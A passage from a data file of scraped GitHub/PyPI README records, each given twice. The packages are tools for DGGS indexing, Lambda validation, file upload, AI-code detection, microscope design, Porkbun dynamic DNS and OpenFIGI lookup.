8cbb53a548b61ff  NA62D/324  POLYGON ((174.30232 -35.69402, 174.30231 -35.6...
8cbb53a548b11ff  NA57C/785  POLYGON ((174.30140 -35.69348, 174.30139 -35.6...
8cbb53a548b15ff  NA57C/785  POLYGON ((174.30161 -35.69346, 174.30160 -35.6...
8cbb53a548b17ff  NA57C/785  POLYGON ((174.30149 -35.69332, 174.30147 -35.6...

[52736 rows x 2 columns]
>>> g.to_parquet('./output-data/parcels.12.geo.parquet')
```

### For development

In brief, to get started:

- Install [Poetry](https://python-poetry.org/docs/basic-usage/)
- Install [GDAL](https://gdal.org/)
    - If you're on Windows, `pip install gdal` may be necessary before running the subsequent commands.
    - On Linux, install GDAL 3.6+ according to your platform-specific instructions, including development headers, i.e. `libgdal-dev`.
- Create the virtual environment with `poetry init`. This will install necessary dependencies.
- Subsequently, the virtual environment can be re-activated with `poetry shell`.

If you run `poetry install`, the CLI tool will be aliased so you can simply use `vector2dggs` rather than `poetry run vector2dggs`, which is the alternative if you do not `poetry install`.

#### Code formatting

[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

Please run `black .` before committing.

## Example commands

With a local GPKG:

```bash
vector2dggs h3 -v DEBUG -id title_no -r 12 -o ~/Downloads/nz-property-titles.gpkg ~/Downloads/nz-property-titles.parquet

```

With a PostgreSQL/PostGIS connection:

```bash
vector2dggs h3 -v DEBUG -id ogc_fid -r 9 -p 5 -t 4 --overwrite -tbl topo50_lake postgresql://user:password@host:port/db ./topo50_lake.parquet
```

## Citation

```bibtex
@software{vector2dggs,
  title={{vector2dggs}},
  author={Ardo, James and Law, Richard},
  url={https://github.com/manaakiwhenua/vector2dggs},
  version={0.2.1},
  date={2023-04-20}
}
```

APA/Harvard

> Ardo, J., & Law, R. (2023). vector2dggs (0.2.1) [Computer software]. https://github.com/manaakiwhenua/vector2dggs

[![manaakiwhenua-standards](https://github.com/manaakiwhenua/vector2dggs/workflows/manaakiwhenua-standards/badge.svg)](https://github.com/manaakiwhenua/manaakiwhenua-standards)
","# vector2dggs

[![pypi](https://img.shields.io/pypi/v/vector2dggs?label=vector2dggs)](https://pypi.org/project/vector2dggs/)

Python-based CLI tool to index raster files to DGGS in parallel, writing out to Parquet.

This is the vector equivalent of [raster2dggs](https://github.com/manaakiwhenua/raster2dggs).

Currently only supports H3 DGGS, and probably has other limitations since it has been developed for a specific internal use case, though it is intended as a general-purpose abstraction. Contributions, suggestions, bug reports and strongly worded letters are all welcome.

Currently only supports polygons; but both coverages (strictly non-overlapping polygons), and sets of polygons that do/may overlap, are supported. Overlapping polygons are captured by ensuring that DGGS cell IDs may be non-unique (repeated) in the output.

![Example use case for vector2dggs, showing parcels indexed to a high H3 resolution](./docs/imgs/vector2dggs-example.png ""Example use case for vector2dggs, showing parcels indexed to a high H3 resolution"")

## Installation

```bash
pip install vector2dggs
```

## Usage

```bash
vector2dggs h3 --help
Usage: vector2dggs h3 [OPTIONS] VECTOR_INPUT OUTPUT_DIRECTORY

  Ingest a vector dataset and index it to the H3 DGGS.

  VECTOR_INPUT is the path to input vector geospatial data. OUTPUT_DIRECTORY
  should be a directory, not a file, as it will be the write location for an
  Apache Parquet data store.

Options:
  -v, --verbosity LVL             Either CRITICAL, ERROR, WARNING, INFO or
                                  DEBUG  [default: INFO]
  -r, --resolution [0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15]
                                  H3 resolution to index  [required]
  -id, --id_field TEXT            Field to use as an ID; defaults to a
                                  constructed single 0...n index on the
                                  original feature order.
  -k, --keep_attributes           Retain attributes in output. The default is
                                  to create an output that only includes H3
                                  cell ID and the ID given by the -id field
                                  (or the default index ID).
  -p, --partitions INTEGER        The number of partitions to create.
                                  Recommendation: at least as many partitions
                                  as there are available `--threads`.
                                  Partitions are processed in parallel once
                                  they have been formed.  [default: 50;
                                  required]
  -s, --spatial_sorting [hilbert|morton|geohash]
                                  Spatial sorting method when perfoming
                                  spatial partitioning.  [default: hilbert]
  -crs, --cut_crs INTEGER         Set the coordinate reference system (CRS)
                                  used for cutting large polygons (see `--cur-
                                  threshold`). Defaults to the same CRS as the
                                  input. Should be a valid EPSG code.
  -c, --cut_threshold INTEGER     Cutting up large polygons into smaller
                                  pieces based on a target length. Units are
                                  assumed to match the input CRS units unless
                                  the `--cut_crs` is also given, in which case
                                  units match the units of the supplied CRS.
                                  [default: 5000; required]
  -t, --threads INTEGER           Amount of threads used for operation
                                  [default: 7]
  -tbl, --table TEXT              Name of the table to read when using a
                                  spatial database connection as input
  -g, --geom_col TEXT             Column name to use when using a spatial
                                  database connection as input  [default:
                                  geom]
  -o, --overwrite
  --help                          Show this message and exit.

```

### Example 




## Visualising output

Output is in the Apache Parquet format, a directory with one file per partition.

For a quick view of your output, you can read Apache Parquet with pandas, and then use h3-pandas and geopandas to convert this into a GeoPackage or GeoParquet for visualisation in a desktop GIS, such as QGIS. The Apache Parquet output is indexed by an ID column (which you can specify), so it should be ready for two intended use-cases:
- Joining attribute data from the original feature-level data onto computer DGGS cells.
- Joining other data to this output on the H3 cell ID. (The output has a column like `h3_\d{2}`, e.g. `h3_09` or `h3_12` according to the target resolution.)

Geoparquet output (hexagon boundaries):

```python
>>> import pandas as pd
>>> import h3pandas
>>> g = pd.read_parquet('./output-data/nz-property-titles.12.parquet').h3.h3_to_geo_boundary()
>>> g
                  title_no                                           geometry
h3_12                                                                        
8cbb53a734553ff  NA94D/635  POLYGON ((174.28483 -35.69315, 174.28482 -35.6...
8cbb53a734467ff  NA94D/635  POLYGON ((174.28454 -35.69333, 174.28453 -35.6...
8cbb53a734445ff  NA94D/635  POLYGON ((174.28416 -35.69368, 174.28415 -35.6...
8cbb53a734551ff  NA94D/635  POLYGON ((174.28496 -35.69329, 174.28494 -35.6...
8cbb53a734463ff  NA94D/635  POLYGON ((174.28433 -35.69335, 174.28432 -35.6...
...                    ...                                                ...
8cbb53a548b2dff  NA62D/324  POLYGON ((174.30249 -35.69369, 174.30248 -35.6...
8cbb53a548b61ff  NA62D/324  POLYGON ((174.30232 -35.69402, 174.30231 -35.6...
8cbb53a548b11ff  NA57C/785  POLYGON ((174.30140 -35.69348, 174.30139 -35.6...
8cbb53a548b15ff  NA57C/785  POLYGON ((174.30161 -35.69346, 174.30160 -35.6...
8cbb53a548b17ff  NA57C/785  POLYGON ((174.30149 -35.69332, 174.30147 -35.6...

[52736 rows x 2 columns]
>>> g.to_parquet('./output-data/parcels.12.geo.parquet')
```

### For development

In brief, to get started:

- Install [Poetry](https://python-poetry.org/docs/basic-usage/)
- Install [GDAL](https://gdal.org/)
    - If you're on Windows, `pip install gdal` may be necessary before running the subsequent commands.
    - On Linux, install GDAL 3.6+ according to your platform-specific instructions, including development headers, i.e. `libgdal-dev`.
- Create the virtual environment with `poetry init`. This will install necessary dependencies.
- Subsequently, the virtual environment can be re-activated with `poetry shell`.

If you run `poetry install`, the CLI tool will be aliased so you can simply use `vector2dggs` rather than `poetry run vector2dggs`, which is the alternative if you do not `poetry install`.

#### Code formatting

[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

Please run `black .` before committing.

## Example commands

With a local GPKG:

```bash
vector2dggs h3 -v DEBUG -id title_no -r 12 -o ~/Downloads/nz-property-titles.gpkg ~/Downloads/nz-property-titles.parquet

```

With a PostgreSQL/PostGIS connection:

```bash
vector2dggs h3 -v DEBUG -id ogc_fid -r 9 -p 5 -t 4 --overwrite -tbl topo50_lake postgresql://user:password@host:port/db ./topo50_lake.parquet
```

## Citation

```bibtex
@software{vector2dggs,
  title={{vector2dggs}},
  author={Ardo, James and Law, Richard},
  url={https://github.com/manaakiwhenua/vector2dggs},
  version={0.2.1},
  date={2023-04-20}
}
```

APA/Harvard

> Ardo, J., & Law, R. (2023). vector2dggs (0.2.1) [Computer software]. https://github.com/manaakiwhenua/vector2dggs

[![manaakiwhenua-standards](https://github.com/manaakiwhenua/vector2dggs/workflows/manaakiwhenua-standards/badge.svg)](https://github.com/manaakiwhenua/manaakiwhenua-standards)
",manaakiwhenua/vector2dggs
pylambdic,https://github.com/agusmdev/pylambdic,1,2340,2340,"# pylambdic

pylambdic is a Python package that simplifies the process of validating input and output for AWS Lambda handlers using Pydantic. It automatically validates the input and output types of your Lambda function using Pydantic models, making it easier to ensure your function is working with the correct data.

## Features

- Automatic input and output validation using Pydantic models.
- Simplified error handling for invalid input and output data.
- Support for AWS Lambda context object.
- Easy integration with existing AWS Lambda functions.

## Installation

Install pylambdic using pip:

```bash
pip install pylambdic
```

## Usage

To use pylambdic, simply import the `handler` decorator and apply it to your AWS Lambda function. You should also define your input and output types using Pydantic models.

Here's an example of how to use pylambdic:

```python
from pydantic import BaseModel
import pylambdic

class InputModel(BaseModel):
    name: str
    age: int

class OutputModel(BaseModel):
    message: str

@pylambdic.handler
def my_lambda_handler(input_data: InputModel) -> OutputModel:
    return OutputModel(message=f""Hello {input_data.name}, you are {input_data.age} years old."")
```

In this example, the `my_lambda_handler` function expects an input event with `name` and `age` fields, and returns a response with a `message` field. pylambdic will automatically validate the input and output data against the `InputModel` and `OutputModel` Pydantic models.

If the input data is invalid, the Lambda function will return a 400 status code with a descriptive error message. If the output data is invalid, it will return a 500 status code with a descriptive error message.

You can also use the context object provided by AWS as follows:

```python

from pydantic import BaseModel
import pylambdic

class InputModel(BaseModel):
    name: str
    age: int

class OutputModel(BaseModel):
    message: str
    request_id: str

@pylambdic.handler
def my_lambda_handler(input_data: InputModel, context) -> OutputModel:
    message = f""Hello {input_data.name}, you are {input_data.age} years old.""
    request_id = context.aws_request_id
    return OutputModel(message=message, request_id=request_id)
```


## Contributing

Contributions are welcome! Please feel free to submit issues and pull requests for consideration.
","# pylambdic

pylambdic is a Python package that simplifies the process of validating input and output for AWS Lambda handlers using Pydantic. It automatically validates the input and output types of your Lambda function using Pydantic models, making it easier to ensure your function is working with the correct data.

## Features

- Automatic input and output validation using Pydantic models.
- Simplified error handling for invalid input and output data.
- Support for AWS Lambda context object.
- Easy integration with existing AWS Lambda functions.

## Installation

Install pylambdic using pip:

```bash
pip install pylambdic
```

## Usage

To use pylambdic, simply import the `handler` decorator and apply it to your AWS Lambda function. You should also define your input and output types using Pydantic models.

Here's an example of how to use pylambdic:

```python
from pydantic import BaseModel
import pylambdic

class InputModel(BaseModel):
    name: str
    age: int

class OutputModel(BaseModel):
    message: str

@pylambdic.handler
def my_lambda_handler(input_data: InputModel) -> OutputModel:
    return OutputModel(message=f""Hello {input_data.name}, you are {input_data.age} years old."")
```

In this example, the `my_lambda_handler` function expects an input event with `name` and `age` fields, and returns a response with a `message` field. pylambdic will automatically validate the input and output data against the `InputModel` and `OutputModel` Pydantic models.

If the input data is invalid, the Lambda function will return a 400 status code with a descriptive error message. If the output data is invalid, it will return a 500 status code with a descriptive error message.

You can also use the context object provided by AWS as follows:

```python

from pydantic import BaseModel
import pylambdic

class InputModel(BaseModel):
    name: str
    age: int

class OutputModel(BaseModel):
    message: str
    request_id: str

@pylambdic.handler
def my_lambda_handler(input_data: InputModel, context) -> OutputModel:
    message = f""Hello {input_data.name}, you are {input_data.age} years old.""
    request_id = context.aws_request_id
    return OutputModel(message=message, request_id=request_id)
```


## Contributing

Contributions are welcome! Please feel free to submit issues and pull requests for consideration.
",agusmdev/pylambdic
fileup,https://github.com/basnijholt/fileup,5,2450,2225,"
# :rocket: fileup - Effortless File Sharing for Command-Line Enthusiasts :rocket:

[![PyPI](https://img.shields.io/pypi/v/fileup.svg)](https://pypi.python.org/pypi/fileup)
[![Build Status](https://github.com/basnijholt/fileup/actions/workflows/pytest.yml/badge.svg)](https://github.com/basnijholt/fileup/actions/workflows/pytest.yml)
[![CodeCov](https://codecov.io/gh/basnijholt/fileup/branch/main/graph/badge.svg)](https://codecov.io/gh/basnijholt/fileup)


`fileup` is your go-to Python package for hassle-free uploading and sharing of files right from your command-line interface! 🖥️🔥 You can set a time limit after which the file will be automatically removed, ensuring the security of your data. 🕒🔒

## :books: Table of Contents

<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->

- [:package: Installation](#package-installation)
- [:memo: Configuration](#memo-configuration)
- [:video_game: Usage](#video_game-usage)
- [:green_apple: macOS Integration](#green_apple-macos-integration)
- [:warning: Limitations](#warning-limitations)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->


## :package: Installation

To install `fileup`, simply run the following command:

```bash
pip install -U fileup
```

## :memo: Configuration

Before you can start sharing your files, you'll need to create a configuration file at `~/.config/fileup/config` with the following structure:

```less
base_url (example: nijholt.biz)
base_folder (example: /domains/nijholt.biz/public_html/)
file_up_folder (example: 'stuff', if fileup needs to put the files in nijholt.biz/stuff)
my_user_name
my_difficult_password
```

## :video_game: Usage

For a list of available commands, type `fu -h`.

In a nutshell, you can use `fileup` by running:

```bash
fu filename
```

If you're uploading a Jupyter notebook (`*.ipynb`), the returned URL will be accessible via [nbviewer.jupyter.org](http://nbviewer.jupyter.org).

## :green_apple: macOS Integration

`fileup` currently supports the `pbcopy` command, so the URL will be automatically copied to your clipboard on macOS systems. 📋✨

## :warning: Limitations

Please note that the automatic clipboard copying feature is only available for macOS users at the moment.

* * *

Give `fileup` a try today and experience the convenience of effortless file sharing right from your command-line! 🎉👏
","
# :rocket: fileup - Effortless File Sharing for Command-Line Enthusiasts :rocket:

[![PyPI](https://img.shields.io/pypi/v/fileup.svg)](https://pypi.python.org/pypi/fileup)
[![Build Status](https://github.com/basnijholt/fileup/actions/workflows/pytest.yml/badge.svg)](https://github.com/basnijholt/fileup/actions/workflows/pytest.yml)
[![CodeCov](https://codecov.io/gh/basnijholt/fileup/branch/main/graph/badge.svg)](https://codecov.io/gh/basnijholt/fileup)


`fileup` is your go-to Python package for hassle-free uploading and sharing of files right from your command-line interface! 🖥️🔥 You can set a time limit after which the file will be automatically removed, ensuring the security of your data. 🕒🔒

## :books: Table of Contents




- [:package: Installation](#package-installation)
- [:memo: Configuration](#memo-configuration)
- [:video_game: Usage](#video_game-usage)
- [:green_apple: macOS Integration](#green_apple-macos-integration)
- [:warning: Limitations](#warning-limitations)




## :package: Installation

To install `fileup`, simply run the following command:

```bash
pip install -U fileup
```

## :memo: Configuration

Before you can start sharing your files, you'll need to create a configuration file at `~/.config/fileup/config` with the following structure:

```less
base_url (example: nijholt.biz)
base_folder (example: /domains/nijholt.biz/public_html/)
file_up_folder (example: 'stuff', if fileup needs to put the files in nijholt.biz/stuff)
my_user_name
my_difficult_password
```

## :video_game: Usage

For a list of available commands, type `fu -h`.

In a nutshell, you can use `fileup` by running:

```bash
fu filename
```

If you're uploading a Jupyter notebook (`*.ipynb`), the returned URL will be accessible via [nbviewer.jupyter.org](http://nbviewer.jupyter.org).

## :green_apple: macOS Integration

`fileup` currently supports the `pbcopy` command, so the URL will be automatically copied to your clipboard on macOS systems. 📋✨

## :warning: Limitations

Please note that the automatic clipboard copying feature is only available for macOS users at the moment.

* * *

Give `fileup` a try today and experience the convenience of effortless file sharing right from your command-line! 🎉👏
",basnijholt/fileup
botsniffer,https://github.com/oscarvalenzuelab/botsniffer,4,1005,1005,"# BotSniffer

Detects source code generated by AI on projects using Machine Learning and ""Feature Extraction.""

## Usage

### On the command line

You can use botsniffer in your terminal as command line. You need to train the tool before being able to detect code.

I included some AI generated snippets, but you need to incorporate a bigger dataset in order to make it fully functional.

```
$ pip3 install botsniffer
$ botsniffer ./ --train (will train using the code in the current directory. Any files with ""ai"" in the name will be taken as AI generated).
$ botsniffer ./ --identify (will list feature extraction scores plus AI as True/False)

## Notice

This tool does not provide legal advice; I'm not a lawyer.

The code is an experimental implementation. Refrain from relying on the accuracy of the output of this tool.

## Contributing

Contributions are very welcome! See [CONTRIBUTING](CONTRIBUTING.md) for more info.

## License

This code is licensed under the [Apache 2.0 License](LICENSE).
","# BotSniffer

Detects source code generated by AI on projects using Machine Learning and ""Feature Extraction.""

## Usage

### On the command line

You can use botsniffer in your terminal as command line. You need to train the tool before being able to detect code.

I included some AI generated snippets, but you need to incorporate a bigger dataset in order to make it fully functional.

```
$ pip3 install botsniffer
$ botsniffer ./ --train (will train using the code in the current directory. Any files with ""ai"" in the name will be taken as AI generated).
$ botsniffer ./ --identify (will list feature extraction scores plus AI as True/False)

## Notice

This tool does not provide legal advice; I'm not a lawyer.

The code is an experimental implementation. Refrain from relying on the accuracy of the output of this tool.

## Contributing

Contributions are very welcome! See [CONTRIBUTING](CONTRIBUTING.md) for more info.

## License

This code is licensed under the [Apache 2.0 License](LICENSE).
",oscarvalenzuelab/botsniffer
kmdouglass-udesigner,https://github.com/kmdouglass/micro-designer,2,644,644,"# Micro-Designer

Design tools for microscopes

## Getting Started

### Installation

```console
pip install git+https://github.com/kmdouglass/micro-designer
```

### Usage

 Run the following commands to 
 
 1. first generate a JSON template for the microscope design parameters, and then
 2. create a HTML design document for a diffraction phase microscope.

```console
# Create an inputs template that you can edit
udesign inputs -o inputs.json

# Create an HTML design document for the microscope
udesign doc -i inputs.json -o output.html
```

## Supported Types of Microscopes

- [Diffraction Phase](https://doi.org/10.1364/OL.31.000775)

","# Micro-Designer

Design tools for microscopes

## Getting Started

### Installation

```console
pip install git+https://github.com/kmdouglass/micro-designer
```

### Usage

 Run the following commands to 
 
 1. first generate a JSON template for the microscope design parameters, and then
 2. create a HTML design document for a diffraction phase microscope.

```console
# Create an inputs template that you can edit
udesign inputs -o inputs.json

# Create an HTML design document for the microscope
udesign doc -i inputs.json -o output.html
```

## Supported Types of Microscopes

- [Diffraction Phase](https://doi.org/10.1364/OL.31.000775)

",kmdouglass/micro-designer
porkbun-ddns,https://github.com/mietzen/porkbun-ddns,0,3817,3755,"# Disclaimer

**This package is not related to or developed by Porkbun. No relationship between the developer of this package and Porkbun exists.**

**All trademarks, logos and brand names are the property of their respective owners. All company, product and service names used in this package are for identification purposes only. Use of these names,trademarks and brands does not imply endorsement.**

# Porkbun DDNS
`porkbun-ddns` is a unofficial DDNS-Client for Porkbun Domains.
This library will only update the records if the IP(s) have changed or the dns entry didn't exist before, it will also set/update A (IPv4) and AAAA (IPv6) records.


Since [porkbun-dynamic-dns-python](https://github.com/porkbundomains/porkbun-dynamic-dns-python) is deprecate and [ddclient](https://github.com/ddclient/ddclient/issues/528) has no more active maintainers, I took it into my own hands to code a decent DDNS Client for Porkbun.
Inspired by [con-f-use](https://github.com/con-f-use) [pull request](https://github.com/porkbundomains/porkbun-dynamic-dns-python/pull/6), I built a pip Package and a docker container.

I also containerized [cert-bun](https://github.com/mietzen/docker-cert-bun).

# CLI

## Install via pip

```shell
pip install porkbun-ddns
```

## Usage

```Shell
$ porkbun-ddns -h
usage: porkbun-ddns [-h] [-i [PUBLIC_IPS ...]] [-f FRITZBOX] [-4 | -6] config domain [subdomain]

positional arguments:
  config                Path to config file
  domain                Domain to be updated
  subdomain             Subdomain

options:
  -h, --help            show this help message and exit
  -i [PUBLIC_IPS ...], --public-ips [PUBLIC_IPS ...]
                        Public IPs (v4 and or v6)
  -f FRITZBOX, --fritzbox FRITZBOX
                        IP or Domain of your Fritz!Box
  -4, --ipv4-only       Only set/update IPv4 A Records
  -6, --ipv6-only       Only set/update IPv6 AAAA Records
```

Examples:

```shell
$ porkbun-ddns ""./config.json"" domain.com my_subdomain

# Set IP's explicit
$ porkbun-ddns ""./config.json"" domain.com my_subdomain -i '1.2.3.4' '1234:abcd:0:4567::8900'

# Use Fritz!Box to obtain IP's and set IPv4 A Record only
$ porkbun-ddns ""./config.json"" domain.com my_subdomain -f fritz.box -4
```

You can set up a cron job get the full path to porkbun-ddns with `which porkbun-ddns`, then execute `crontab -e` and add the following line:

```
*/30 * * * * <PORKBUN-DDNS-PATH>/porkbun-ddns ""<YOUR-PATH>/config.json"" domain.com my.subdomain >/dev/null 2>&1
```

# Docker-Compose

```yaml
version: ""3""
services:
  porkbun-ddns:
    image: ""mietzen/porkbun-ddns:latest""
    container_name: porkbun-ddns
    environment:
      DOMAIN: ""domain.com"" # Your Porkbun domain
      SUBDOMAINS: ""my_subdomain,my_other_subdomain,my_subsubdomain.my_subdomain"" # Subdomains comma spreaded
      SECRETAPIKEY: ""<YOUR-SECRETAPIKEY>"" # Your Porkbun Secret-API-Key
      APIKEY: ""<YOUR-APIKEY>"" # Your Porkbun API-Key
      # PUBLIC_IPS: ""1.2.3.4,2001:043e::1"" # Set if you got static IP's
      # FRITZBOX: ""192.168.178.1"" # Use Fritz!BOX to obtain Public IP's
      # SLEEP: ""300"" # Seconds to sleep between DynDNS runs
      # IPV4_ONLY: ""FALSE"" # Only set IPv4 address
      # IPV6_ONLY: ""FALSE"" # Only set IPv6 address
    restart: unless-stopped
```

# Python

```python
from porkbun_ddns import PorkbunDDNS

config = {
    'secretapikey': 'YOUR-SECRETAPIKEY',
    'apikey': 'YOUR-APIKEY'
}

porkbun_ddns = PorkbunDDNS(config, 'domain.com')
# porkbun_ddns = PorkbunDDNS('./config.json', 'domain.com')
# porkbun_ddns_ip = PorkbunDDNS('./config.json', 'domain.com', public_ips=['1.2.3.4','1234:abcd:0:4567::8900'])
# porkbun_ddns_fritz = PorkbunDDNS('./config.json', 'domain.com', fritzbox='fritz.box', ipv6=False)

porkbun_ddns.set_subdomain('my_subdomain')
porkbun_ddns.update_records()
```
","# Disclaimer

**This package is not related to or developed by Porkbun. No relationship between the developer of this package and Porkbun exists.**

**All trademarks, logos and brand names are the property of their respective owners. All company, product and service names used in this package are for identification purposes only. Use of these names,trademarks and brands does not imply endorsement.**

# Porkbun DDNS
`porkbun-ddns` is a unofficial DDNS-Client for Porkbun Domains.
This library will only update the records if the IP(s) have changed or the dns entry didn't exist before, it will also set/update A (IPv4) and AAAA (IPv6) records.


Since [porkbun-dynamic-dns-python](https://github.com/porkbundomains/porkbun-dynamic-dns-python) is deprecate and [ddclient](https://github.com/ddclient/ddclient/issues/528) has no more active maintainers, I took it into my own hands to code a decent DDNS Client for Porkbun.
Inspired by [con-f-use](https://github.com/con-f-use) [pull request](https://github.com/porkbundomains/porkbun-dynamic-dns-python/pull/6), I built a pip Package and a docker container.

I also containerized [cert-bun](https://github.com/mietzen/docker-cert-bun).

# CLI

## Install via pip

```shell
pip install porkbun-ddns
```

## Usage

```Shell
$ porkbun-ddns -h
usage: porkbun-ddns [-h] [-i [PUBLIC_IPS ...]] [-f FRITZBOX] [-4 | -6] config domain [subdomain]

positional arguments:
  config                Path to config file
  domain                Domain to be updated
  subdomain             Subdomain

options:
  -h, --help            show this help message and exit
  -i [PUBLIC_IPS ...], --public-ips [PUBLIC_IPS ...]
                        Public IPs (v4 and or v6)
  -f FRITZBOX, --fritzbox FRITZBOX
                        IP or Domain of your Fritz!Box
  -4, --ipv4-only       Only set/update IPv4 A Records
  -6, --ipv6-only       Only set/update IPv6 AAAA Records
```

Examples:

```shell
$ porkbun-ddns ""./config.json"" domain.com my_subdomain

# Set IP's explicit
$ porkbun-ddns ""./config.json"" domain.com my_subdomain -i '1.2.3.4' '1234:abcd:0:4567::8900'

# Use Fritz!Box to obtain IP's and set IPv4 A Record only
$ porkbun-ddns ""./config.json"" domain.com my_subdomain -f fritz.box -4
```

You can set up a cron job get the full path to porkbun-ddns with `which porkbun-ddns`, then execute `crontab -e` and add the following line:

```
*/30 * * * * /porkbun-ddns ""/config.json"" domain.com my.subdomain >/dev/null 2>&1
```

# Docker-Compose

```yaml
version: ""3""
services:
  porkbun-ddns:
    image: ""mietzen/porkbun-ddns:latest""
    container_name: porkbun-ddns
    environment:
      DOMAIN: ""domain.com"" # Your Porkbun domain
      SUBDOMAINS: ""my_subdomain,my_other_subdomain,my_subsubdomain.my_subdomain"" # Subdomains comma spreaded
      SECRETAPIKEY: """" # Your Porkbun Secret-API-Key
      APIKEY: """" # Your Porkbun API-Key
      # PUBLIC_IPS: ""1.2.3.4,2001:043e::1"" # Set if you got static IP's
      # FRITZBOX: ""192.168.178.1"" # Use Fritz!BOX to obtain Public IP's
      # SLEEP: ""300"" # Seconds to sleep between DynDNS runs
      # IPV4_ONLY: ""FALSE"" # Only set IPv4 address
      # IPV6_ONLY: ""FALSE"" # Only set IPv6 address
    restart: unless-stopped
```

# Python

```python
from porkbun_ddns import PorkbunDDNS

config = {
    'secretapikey': 'YOUR-SECRETAPIKEY',
    'apikey': 'YOUR-APIKEY'
}

porkbun_ddns = PorkbunDDNS(config, 'domain.com')
# porkbun_ddns = PorkbunDDNS('./config.json', 'domain.com')
# porkbun_ddns_ip = PorkbunDDNS('./config.json', 'domain.com', public_ips=['1.2.3.4','1234:abcd:0:4567::8900'])
# porkbun_ddns_fritz = PorkbunDDNS('./config.json', 'domain.com', fritzbox='fritz.box', ipv6=False)

porkbun_ddns.set_subdomain('my_subdomain')
porkbun_ddns.update_records()
```
",mietzen/porkbun-ddns
pyopenfigi,https://github.com/tlouarn/pyopenfigi,4,10342,10342,"## pyopenfigi

![Python 3.10](https://img.shields.io/badge/python-3.10-blue)
![Black](https://img.shields.io/badge/code%20style-black-black)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

Python wrapper for the [OpenFIGI API](https://www.openfigi.com/api) v3.

## Table of contents

- [About OpenFIGI](#about-openfigi)
- [Installation](#installation)
- [API key](#api-key)
- [Mapping](#mapping)
- [Filtering](#filtering)
- [Troubleshooting](#troubleshooting)

## About OpenFIGI

- The **F**inancial **I**nstrument **G**lobal **I**dentifier (FIGI) is a universal system for identifying instruments
  globally and across all asset classes
- OpenFIGI is an application programming interface that provides automated access
  to mapping various symbols with their corresponding FIGI. It is available at https://www.openfigi.com/
- [pyopenfigi](https://github.com/tlouarn/pyopenfigi) is a
  thin Python wrapper to access OpenFIGI

The API contains 3 endpoints:

| endpoint | description                                          |
|----------|------------------------------------------------------|
| /mapping | Map third-party identifiers to FIGIs                 |
| /filter  | Filter for FIGIs using keywords and optional filters |
| /search  | Search for FIGIs using keywords and optional filters |

_Note: given that the */search* endpoint is strictly superseded by the */filter* endpoint, we
choose not to include it in the wrapper._

## Installation

**pyopenfigi** is published on [PyPI](https://pypi.org/project/pyopenfigi/). To install it, simply run:

```commandline
pip install pyopenfigi
```

## API key

The API can be used with or without API key.
Getting an API key is free and loosens the [rate limits](https://www.openfigi.com/api#rate-limit).

When instantiating the wrapper, the API key is optional:

```python
from pyopenfigi import OpenFigi

wrapper = OpenFigi()
wrapper = OpenFigi(api_key=""XXXXXXXXXX"")
```

## Mapping

The `map()` method takes a list of `MappingJob` as argument and returns a list of `MappingJobResult`. The
result of the request at index `i` in the list of mapping jobs is located at index `i` in the list of results.

```python
from pyopenfigi import OpenFigi, MappingJob

mapping_job = MappingJob(id_type=""TICKER"", id_value=""IBM"", exch_code=""US"")
mapping_jobs = [mapping_job]
results = OpenFigi().map(mapping_jobs)

>>> results
[
    MappingJobResultFigiList(
        data = [
            FigiResult(
                  figi='BBG000BLNNH6', 
                  security_type='Common Stock', 
                  market_sector='Equity', 
                  ticker='IBM', 
                  name='INTL BUSINESS MACHINES CORP', 
                  exch_code='US', 
                  share_class_figi='BBG001S5S399', 
                  composite_figi='BBG000BLNNH6', 
                  security_type2='Common Stock', 
                  security_description='IBM', 
                  metadata=None
            )
        ]
    )
]
```

A `MappingJobResult` can either be a `MappingJobResultFigiList`, a `MappingJobResultFigiNotFound` or a
`MappingJobResultError`.

The `MappingJob` object has 2 required properties which are `id_type` and `id_value`. The other properties are optional
but subject to specific rules in case they are provided. These rules are modeled and checked using **Pydantic**.

Below is the full list of properties for `MappingJob`:

| property                  | required | type | example                                  |
|---------------------------|----------|------|------------------------------------------|
| id_type                   | X        | str  | `""TICKER""`                               |
| id_value                  | X        | str  | `""IBM""`                                  |
| exch_code                 |          | str  | `""UN""`                                   |
| mic_code                  |          | str  | `""XNYS""`                                 |
| currency                  |          | str  | `""USD""`                                  |
| market_sec_des            |          | str  | `""Equity""`                               |
| security_type             |          | str  | `""Common Stock""`                         |
| security_type_2           |          | str  | `""Common Stock""`                         |
| include_unlisted_equities |          | bool |                                          |
| option_type               |          | str  | `""Call""`                                 | 
| strike                    |          | list | `[100, 200]`                             |
| contract_size             |          | list | `[0, 100]`                               |
| coupon                    |          | list | `[0, 2.5]`                               |
| expiration                |          | list | `[date(2023, 6, 1), date(2023, 12, 31)]` |
| maturity                  |          | list | `[date(2023, 6, 1), date(2023, 12, 31)]` |
| state_code                |          | str  | `""AZ""`                                   |

Some of the properties in the `MappingJob` are ""enum-like"". For each of these properties, it is possible to
retrieve the current list of accepted values via specific methods:

| property        | method                   | examples |
|-----------------|--------------------------|----------|
| id_type         | `get_id_types()`         |          |
| exch_code       | `get_exch_codes()`       |          |
| mic_code        | `get_mic_codes()`        |          |
| currency        | `get_currencies()`       |          |
| market_sec_des  | `get_market_sec_des()`   |          |
| security_type   | `get_security_types()`   |          |
| security_type_2 | `get_security_types_2()` |          |
| state_code      | `get_state_codes()`      |          |

For example, to retrieve the current values for `id_type`:

```python
from pyopenfigi import OpenFigi

id_types = OpenFigi().get_id_types()
```

## Filtering

The `filter()` method takes a `Query` object as argument and returns a list of `FigiResult`.

* The `Query` object is very similar to the `MappingJob` object 
* The only difference are that the `id_type` and `id_value` are replaced by a single `query` property
* All the ""enum-like"" properties are the same and the list of accepted values is the same
* The maximum number of results is limited to 15,000

| property                  | required | type | example                                  |
|---------------------------|----------|------|------------------------------------------|
| query                     | X        | str  | `""SJIM""`                                 |
| exch_code                 |          | str  | `""UN""`                                   |
| mic_code                  |          | str  | `""XNYS""`                                 |
| currency                  |          | str  | `""USD""`                                  |
| market_sec_des            |          | str  | `""Equity""`                               |
| security_type             |          | str  | `""Common Stock""`                         |
